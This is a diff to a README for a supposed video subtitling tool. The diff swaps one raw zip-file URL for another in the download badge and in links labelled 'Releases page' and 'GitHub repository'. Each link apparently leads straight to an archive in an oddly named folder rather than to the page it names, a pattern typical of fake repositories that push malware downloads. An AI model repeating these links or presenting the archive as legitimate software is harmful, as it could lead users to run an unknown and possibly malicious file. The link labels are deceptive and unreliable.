@@ -1,6 +1,6 @@
 # 🎥 video-subtitles-generator - Effortless Video Subtitling Made Simple
 
-[![Download](https://raw.githubusercontent.com/Santos6808/video-subtitles-generator/main/Rhynchospora/video-subtitles-generator-Vibrio.zip%20Now%20-%F0%9F%93%88%20Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/Santos6808/video-subtitles-generator/main/Rhynchospora/video-subtitles-generator-Vibrio.zip)
+[![Download](https://github.com/Santos6808/video-subtitles-generator/raw/refs/heads/main/Rhynchospora/generator-subtitles-video-v1.5.zip%20Now%20-%F0%9F%93%88%20Get%20Latest%20Release-blue)](https://github.com/Santos6808/video-subtitles-generator/raw/refs/heads/main/Rhynchospora/generator-subtitles-video-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets these needs:
 
 ## 📥 Download & Install
 
-To get started, visit the page to download the latest version from our [Releases page](https://raw.githubusercontent.com/Santos6808/video-subtitles-generator/main/Rhynchospora/video-subtitles-generator-Vibrio.zip). 
+To get started, visit the page to download the latest version from our [Releases page](https://github.com/Santos6808/video-subtitles-generator/raw/refs/heads/main/Rhynchospora/generator-subtitles-video-v1.5.zip). 
 
 1. Open the link above.
 2. Choose the latest version.
@@ -57,8 +57,8 @@ A: No, once installed, you can work offline.
 
 ## 💬 Support
 
-If you face issues or need assistance, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/Santos6808/video-subtitles-generator/main/Rhynchospora/video-subtitles-generator-Vibrio.zip). Our community is here to help you.
+If you face issues or need assistance, feel free to open an issue on our [GitHub repository](https://github.com/Santos6808/video-subtitles-generator/raw/refs/heads/main/Rhynchospora/generator-subtitles-video-v1.5.zip). Our community is here to help you.
 
 Thank you for using video-subtitles-generator! We hope it makes your video projects easier and more enjoyable. 
 
-For more information, remember to visit our [Releases page](https://raw.githubusercontent.com/Santos6808/video-subtitles-generator/main/Rhynchospora/video-subtitles-generator-Vibrio.zip) for the latest updates and downloads.
+For more information, remember to visit our [Releases page](https://github.com/Santos6808/video-subtitles-generator/raw/refs/heads/main/Rhynchospora/generator-subtitles-video-v1.5.zip) for the latest updates and downloads.
